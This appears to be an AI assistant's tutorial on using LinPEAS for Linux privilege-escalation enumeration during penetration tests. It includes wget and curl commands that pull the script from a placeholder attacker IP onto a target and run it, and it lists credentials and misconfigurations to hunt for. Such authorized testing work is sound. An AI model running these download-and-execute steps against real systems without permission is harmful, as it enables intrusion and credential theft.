Great question! Let’s walk through how to use **LinPEAS**, the *Linux* version of PEASS, to help with privilege escalation assessments on Linux systems.

Like WinPEAS, LinPEAS is designed to find misconfigurations, kernel exploits, weak permissions, and more. Here’s a **step-by-step guide** to get you started, including commands to download, transfer, and execute LinPEAS on a target system.

---

## 🔹 Step 1: Download LinPEAS

Grab the latest **LinPEAS** from GitHub:

👉 [https://github.com/carlospolop/PEASS-ng/releases/latest](https://github.com/carlospolop/PEASS-ng/releases/latest)

Choose **linpeas.sh** from the "assets" section.

---

## 🔹 Step 2: Transfer LinPEAS to the Target

There are a few common ways to get LinPEAS onto a Linux target:

### ➡️ Using `wget`:

```bash
wget http://<attacker-ip>/linpeas.sh -O /tmp/linpeas.sh
```

### ➡️ Using `curl`:

```bash
curl http://<attacker-ip>/linpeas.sh -o /tmp/linpeas.sh
```

*(Make sure you have a simple HTTP server running on your attacking machine, e.g., `python3 -m http.server 8000` in the directory where linpeas.sh is stored.)*

---

## 🔹 Step 3: Make LinPEAS Executable

```bash
chmod +x /tmp/linpeas.sh
```

---

## 🔹 Step 4: Run LinPEAS

Execute LinPEAS with:

```bash
/tmp/linpeas.sh
```

Or, to redirect the output to a file for easier analysis:

```bash
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

---

## 🔹 Step 5: Analyze the Output

Look for:

* SUID/SGID binaries
* Writable or world-readable files in sensitive locations
* Interesting cron jobs
* Kernel exploits
* Credential leaks in environment variables, history, or configs
* Docker misconfigurations
* Password reuse or trust relationships

## 🔹 Summary of Commands

```bash
# 1. Download linpeas.sh on your attacker machine:
#    (Or get it from: https://github.com/carlospolop/PEASS-ng/releases/latest)

# 2. Transfer to target:
wget http://<attacker-ip>:8000/linpeas.sh -O /tmp/linpeas.sh
# OR
curl http://<attacker-ip>:8000/linpeas.sh -o /tmp/linpeas.sh

# 3. Make executable:
chmod +x /tmp/linpeas.sh

# 4. Run it:
/tmp/linpeas.sh

# Optional: Save output
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

---

## 🔹 Notes

✅ Always check the target’s architecture and use the proper exploit versions if needed.
✅ LinPEAS is a **read-only** tool — it just enumerates, so it’s usually safe to run on target systems.
✅ Always get **authorization** before running LinPEAS in real environments (e.g., during a penetration test with permission).
